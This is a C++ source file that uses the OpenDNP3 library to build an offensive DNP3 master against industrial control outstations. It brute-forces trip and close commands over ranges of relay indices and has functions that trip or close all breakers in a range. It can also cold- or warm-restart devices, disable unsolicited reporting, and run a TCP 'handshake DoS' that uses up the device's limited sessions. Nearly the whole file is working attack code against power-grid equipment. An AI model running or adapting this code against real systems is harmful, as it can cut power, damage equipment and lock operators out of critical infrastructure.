#include "dnp3_actions.h"

#include <list>

using namespace std;
using namespace opendnp3;

/**
 * DNP3 Classes
 *  Class 0 - static data
 *  Class 1, 2, 3 - event data
 */
Header GetHeader(int c)
{
    Header header;

    switch (c)
    {
    case 0:
        header = Header::From(PointClass::Class0);
        break;
    case 1:
        header = Header::From(PointClass::Class1);
        break;
    case 2:
        header = Header::From(PointClass::Class2);
        break;
    case 3:
        header = Header::From(PointClass::Class3);
    }
    return header;
}

/**
 * DNP3 Trip Close Control Codes
 */
TripCloseCode GetTripCloseCode(uint8_t code)
{
    switch (code)
    {
    case 0x0: {
        return TripCloseCode::NUL;
    }
    case 0x1: {
        return TripCloseCode::CLOSE;
    }
    case 0x2: {
        return TripCloseCode::TRIP;
    }
    default: {
        return TripCloseCode::NUL;
    }
    }
}

/**
 * Contains logic for looping over a range of indices,
 * for Select-before-Operate and Direct-Operate functions.
 *
 * DNP3 Protocol Functions
 * Code 3 (0x03) SELECT
 * Code 4 (0x04) OPERATE
 *
 * Code 5 (0x05) DIRECT_OPERATE
 *
 * OperationType::PULSE_OFF / OperationType::PULSE_ON,
 * Able to specify Trip Codes for TripOff and TripOn
 */
void BruteForceOutstation(shared_ptr<IMaster> master,
                          uint8_t operate_type,
                          int start_index,
                          int end_index,
                          int iterations,
                          uint8_t trip_on,
                          uint8_t trip_off,
                          uint32_t on_time,
                          uint32_t off_time)
{
    // Explains the different combinations of OperateType, TripCloseCode, and Clear bits
    // https://www.kepware.com/getattachment/ae44d711-0ccb-4cf3-b1e5-6a914bd9b25e/DNP3-Control-Relay-Output-Block-Command.pdf
    int i;

    TripCloseCode trip_on_code = GetTripCloseCode(trip_on);
    TripCloseCode trip_off_code = GetTripCloseCode(trip_off);

    for (i = 0; i < iterations; i++)
    {
        for (int j = start_index; j <= end_index; j = j + 2)
        {
            switch (operate_type)
            {
            case 0x0: {
                ControlRelayOutputBlock crob1(OperationType::PULSE_OFF, trip_off_code, false, 1, on_time, off_time);
                master->SelectAndOperate(crob1, j, PrintingCommandResultCallback::Get());
                this_thread::sleep_for(chrono::milliseconds(1000));

                ControlRelayOutputBlock crob2(OperationType::PULSE_ON, trip_on_code, false, 1, on_time, off_time);
                master->SelectAndOperate(crob2, j + 1, PrintingCommandResultCallback::Get());
                this_thread::sleep_for(chrono::milliseconds(1000));

                break;
            }
            case 0x1: {
                ControlRelayOutputBlock crob2(OperationType::PULSE_OFF, trip_off_code, false, 1, on_time, off_time);
                master->DirectOperate(crob2, j, PrintingCommandResultCallback::Get());
                this_thread::sleep_for(chrono::milliseconds(1000));

                ControlRelayOutputBlock crob1(OperationType::PULSE_ON, trip_on_code, false, 1, on_time, off_time);
                master->DirectOperate(crob1, j + 1, PrintingCommandResultCallback::Get());
                this_thread::sleep_for(chrono::milliseconds(1000));
                break;
            }
            default: {
                cout << "ERROR: Unknown operate type" << endl;
            }
            }
        }
    }
}

/**
 * Read
 *
 * DNP3 Protocol Function
 * Code 1 (0x01) READ
 */
void ReadFromOutstation(shared_ptr<IMaster> master, int object, int variation, int start_range, int end_range)
{

    auto test_soe_handler = make_shared<TestSOEHandler>();
    GroupVariationID g;
    g.group = object;
    g.variation = variation;
    master->ScanRange(g, start_range, end_range, test_soe_handler);

    this_thread::sleep_for(chrono::milliseconds(1000));
}

/**
 * Disable Unsolicited Messages
 *
 * DNP3 Protocol Function
 * Code 21 (0x15) DISABLE_UNSOLICITED
 */
void DisableUnsolicitedMessagesOnOutstation(shared_ptr<IMaster> master, vector<int> classes)
{
    vector<Header> v;
    ParseClasses(classes, &v);
    master->PerformFunction("disable unsolicited", FunctionCode::DISABLE_UNSOLICITED, v);
    this_thread::sleep_for(chrono::milliseconds(1000));
}

/**
 * Enable Unsolicited Messages
 *
 * DNP3 Protocol Function
 * Code 20 (0x14) ENABLE_UNSOLICITED
 */
void EnableUnsolicitedMessagesOnOutstation(shared_ptr<IMaster> master, vector<int> classes)
{
    vector<Header> v;
    ParseClasses(classes, &v);

    master->PerformFunction("enable unsolicited", FunctionCode::ENABLE_UNSOLICITED, v);
    this_thread::sleep_for(chrono::milliseconds(1000));
}

/**
 * Helper function to process the classes (vector of integers)
 * passed to Disable and Enable Unsolicited Messages
 */
void ParseClasses(vector<int> classes, vector<Header>* v)
{
    int i;
    for (i = 0; i < classes.size(); i++)
    {
        Header header = GetHeader(classes.at(i));
        v->push_back(header);
    }
}

/**
 * Integrity Poll
 *
 * DNP3 Protocol Function
 * Code 1 (0x01) READ / GROUP 60 / VAR 1
 */
void CollectAllDataFromOutstation(shared_ptr<IMaster> master)
{
    this_thread::sleep_for(chrono::milliseconds(1000));
    auto test_soe_handler = make_shared<TestSOEHandler>();
    master->ScanClasses(ClassField::AllClasses(), test_soe_handler);
    this_thread::sleep_for(chrono::milliseconds(1000));
}


/**
 * Select-before-Operate - able to pass OperationType and TripCode to use.
 *
 * DNP3 Protocol Function
 * Code 3 (0x03) SELECT
 * Code 4 (0x04) OPERATE
 */
void Sbo(shared_ptr<IMaster> master, OperationType opType, uint8_t tripCode, int start_index, int end_index, int step)
{
    TripCloseCode tcc = GetTripCloseCode(tripCode);

    for (int i = start_index; i <= end_index; i = i + step)
    {
        ControlRelayOutputBlock crob(opType, tcc, false, 1);
        master->SelectAndOperate(crob, i, PrintingCommandResultCallback::Get());
        this_thread::sleep_for(chrono::milliseconds(1000));
    }
}

/**
 * Contains logic for looping over and toggling off a range of indices.
 * Currently leveraged for Direct Operate functionality in the CLI.
 *
 * DNP3 Protocol Functions
 * Code 5 (0x05) DIRECT_OPERATE
 *
 * OperationType::PULSE_ON, TripCloseCode::TRIP
 */
void ToggleOnAllBreakers(shared_ptr<IMaster> master, uint8_t operate_type, int start_index, int end_index, int step)
{
    for (int i = start_index; i <= end_index; i = i + step)
    {
        switch (operate_type)
        {
        case 0x0: {
            ControlRelayOutputBlock crob1(OperationType::PULSE_ON, TripCloseCode::TRIP, false, 1);
            master->SelectAndOperate(crob1, i, PrintingCommandResultCallback::Get());
            this_thread::sleep_for(chrono::milliseconds(1000));
            break;
        }
        case 0x1: {
            ControlRelayOutputBlock crob1(OperationType::PULSE_ON, TripCloseCode::TRIP, false, 1);
            master->DirectOperate(crob1, i, PrintingCommandResultCallback::Get());
            this_thread::sleep_for(chrono::milliseconds(1000));
            break;
        }
        }
    }
}

/*
 * Contains logic for looping over and toggling on a range of indices.
 * Currently leveraged for Direct Operate functionality in the CLI.
 *
 * DNP3 Protocol Functions
 * Code 5 (0x05) DIRECT_OPERATE
 *
 * OperationType::PULSE_OFF, TripCloseCode::CLOSE
 */
void ToggleOffAllBreakers(shared_ptr<IMaster> master, uint8_t operate_type, int start_index, int end_index, int step)
{
    for (int i = start_index; i <= end_index; i = i + step)
    {
        switch (operate_type)
        {
        case 0x0: {
            ControlRelayOutputBlock crob1(OperationType::PULSE_OFF, TripCloseCode::CLOSE, false, 1);
            master->SelectAndOperate(crob1, i, PrintingCommandResultCallback::Get());
            this_thread::sleep_for(chrono::milliseconds(1000));
            break;
        }
        case 0x1: {
            ControlRelayOutputBlock crob1(OperationType::PULSE_OFF, TripCloseCode::CLOSE, false, 1);
            master->DirectOperate(crob1, i, PrintingCommandResultCallback::Get());
            this_thread::sleep_for(chrono::milliseconds(1000));
            break;
        }
        }
    }
}

/* Leverages some code from OpenDNP3 examples.
 *
 * Copyright 2013-2020 Automatak, LLC
 *
 * Licensed to Green Energy Corp (www.greenenergycorp.com) and Automatak
 * LLC (www.automatak.com) under one or more contributor license agreements.
 * See the NOTICE file distributed with this work for additional information
 * regarding copyright ownership. Green Energy Corp and Automatak LLC license
 * this file to you under the Apache License, Version 2.0 (the "License"); you
 * may not use this file except in compliance with the License. You may obtain
 * a copy of the License at:
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Handles Cold and Warm Restart of Outstations
 *
 * DNP3 Protocol Functions
 * Code 13 (0x0E) COLD_RESTART
 *
 * Code 14 (0x0E) WARM_RESTART
 */
void RestartOutstation(shared_ptr<IMaster> master, RestartType restart_type)
{
    auto print = [](const RestartOperationResult& result) {
        if (result.summary == TaskCompletion::SUCCESS)
        {
            cout << "Success, Time: " << result.restartTime.ToString() << endl;
        }
        else
        {
            cout << "Failure: " << TaskCompletionSpec::to_string(result.summary) << endl;
        }
    };
    master->Restart(restart_type, print);
    this_thread::sleep_for(chrono::milliseconds(10000));
}

/**
 * Deny TCP sessions
 * Attempts repeated TCP handshakes with one or more clients,
 * in attempt to prevent other sessions.
 *
 * This may occur as many DNP3 devices may only make a limited
 * amount of active TCP sessions available.
 */
void DenyTcpSessions(shared_ptr<IMaster> master,
                       DNP3Manager* manager,
                       IPEndpoint* endpoint,
                       MasterStackConfig config,
                       int add_clients,
                       int run_time)
{
    list<shared_ptr<IMaster>> clients = {master};

    // Add any additional clients
    const auto logging = levels::NORMAL | levels::ALL_APP_COMMS;

    config.master.responseTimeout = TimeDuration::Seconds(120);
    config.master.disableUnsolOnStartup = false;
    config.master.unsolClassMask = ClassField::None();
    config.master.startupIntegrityClassMask = ClassField::None();

    // Set for best config for handshake DoS.
    ChannelRetry channel_retry = ChannelRetry(TimeDuration::Seconds(0), TimeDuration::Seconds(0));

    for (int i = 0; i < add_clients; i++) {
        auto chan_id = "tcpclient_" + to_string(i + 1);
        auto channel2 = manager->AddTCPClient(chan_id, logging, channel_retry, {*endpoint}, "0.0.0.0",
                                              PrintingChannelListener::Create());

        auto master_id = "master_" + to_string(i + 1);
        auto master2 = channel2->AddMaster(master_id,                          // id for logging
                                           PrintingSOEHandler::Create(),       // callback for data processing
                                           DefaultMasterApplication::Create(), // master application instance
                                           config                              // configuration
        );
        clients.push_back(master2);
    }

    cout << "Handshaking..." << endl;
    for (shared_ptr<IMaster> c : clients) {
        c->Enable();
    }

    this_thread::sleep_for(chrono::milliseconds(100));
    if (run_time == 0) {
        while (1) {};
    } else {
        for (auto start = chrono::steady_clock::now(), now = start; now < start + chrono::seconds{run_time};
             now = chrono::steady_clock::now()) {};
    }
}